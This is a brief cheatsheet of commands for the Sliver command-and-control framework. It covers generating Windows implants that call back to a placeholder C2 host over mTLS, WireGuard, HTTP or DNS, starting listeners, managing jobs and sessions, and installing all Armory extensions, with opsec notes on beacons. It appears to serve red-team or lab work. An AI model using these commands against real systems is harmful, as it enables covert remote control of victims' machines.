# Sliver Cheatsheet

[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
```go
sliver
// View all implants
implants
// Generate Beacons and Sessions
generate
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions opsec unsafe
generate --mtls domain.com --os windows --save 
// Beacons are asychronous - more opsec way they sleep and check 
generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows --save /path/to/directory
// Regenerate
regenerate
// listeners
// Do not accept interfaces as arguemnts like metasploit
mtls -L <lhost> -l <lport> 
wg
https
http
dns
// Jobs to view and manage listners
jobs
jobs -k <job number>
jobs -K <kill all jobs>
// Interact with sessions
use sessionID 
```

Armory
```go
// Because why not
armory install all 
```